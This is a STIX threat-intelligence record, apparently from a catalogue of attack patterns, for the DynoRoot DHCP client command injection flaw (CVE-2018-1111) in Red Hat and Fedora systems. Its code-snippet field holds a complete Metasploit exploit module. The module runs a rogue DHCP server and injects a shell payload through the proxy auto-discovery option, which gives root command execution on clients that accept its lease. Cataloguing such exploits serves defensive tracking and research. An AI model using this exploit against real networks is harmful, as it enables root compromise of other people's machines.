{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d1633c76-9abf-4f30-80d2-860ac28980a7",
    "created": "2024-08-14T17:14:21.175548Z",
    "modified": "2024-08-14T17:14:21.175552Z",
    "name": "DHCP Client Command Injection (DynoRoot)",
    "description": " This module exploits the DynoRoot vulnerability, a flaw in how the NetworkManager integration script included in the DHCP client in Red Hat Enterprise Linux 6 and 7, Fedora 28, and earlier processes DHCP options. A malicious DHCP server, or an attacker on the local network able to spoof DHCP responses, could use this flaw to execute arbitrary commands with root privileges on systems using NetworkManager and configured to obtain network configuration using the DHCP protocol. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/dhcp/rhel_dhcp_client_command_injection.rb",
            "external_id": "rhel_dhcp_client_command_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-1111"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/kkirsche/CVE-2018-1111"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/_fel1x/status/996388421273882626?lang=en"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/security/vulnerabilities/3442151"
        },
        {
            "source_name": "reference",
            "url": "https://dynoroot.ninja/"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1111"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/blog/advisory-red-hat-dhcp-client-command-injection-trouble"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::DHCPServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DHCP Client Command Injection (DynoRoot)',\n      'Description'    => %q{\n        This module exploits the DynoRoot vulnerability, a flaw in how the\n         NetworkManager integration script included in the DHCP client in\n         Red Hat Enterprise Linux 6 and 7, Fedora 28, and earlier\n         processes DHCP options. A malicious DHCP server, or an attacker on\n         the local network able to spoof DHCP responses, could use this flaw\n         to execute arbitrary commands with root privileges on systems using\n         NetworkManager and configured to obtain network configuration using\n         the DHCP protocol.\n      },\n      'Author'         =>\n        [\n          'Felix Wilhelm', # Vulnerability discovery\n          'Kevin Kirsche <d3c3pt10n[AT]deceiveyour.team>' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => true,\n      'References'     =>\n        [\n          ['CVE', '2018-1111'],\n          ['EDB', '44652'],\n          ['URL', 'https://github.com/kkirsche/CVE-2018-1111'],\n          ['URL', 'https://twitter.com/_fel1x/status/996388421273882626?lang=en'],\n          ['URL', 'https://access.redhat.com/security/vulnerabilities/3442151'],\n          ['URL', 'https://dynoroot.ninja/'],\n          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2018-1111'],\n          ['URL', 'https://www.tenable.com/blog/advisory-red-hat-dhcp-client-command-injection-trouble'],\n        ],\n      'Targets'        => [ [ 'Automatic Target', { }] ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2018-05-15',\n      'Notes' =>\n          {\n            'Stability' => [CRASH_SAFE],\n            'SideEffects' => [],\n            'Reliability' => [],\n            'AKA' => ['DynoRoot']\n          }\n    ))\n\n    deregister_options('DOMAINNAME', 'HOSTNAME', 'URL', 'FILENAME')\n  end\n\n  def exploit\n    hash = datastore.copy\n    start_service(hash)\n    @dhcp.set_option(proxy_auto_discovery: \"#{Rex::Text.rand_text_alpha(6..12)}'&#{payload.encoded} #\")\n\n    while @dhcp.thread.alive?\n      sleep 2\n    end\n  end\n\n  def cleanup\n    super\n    stop_service\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-05-15",
    "x_mitre_platforms": [
        "['unix']"
    ]
}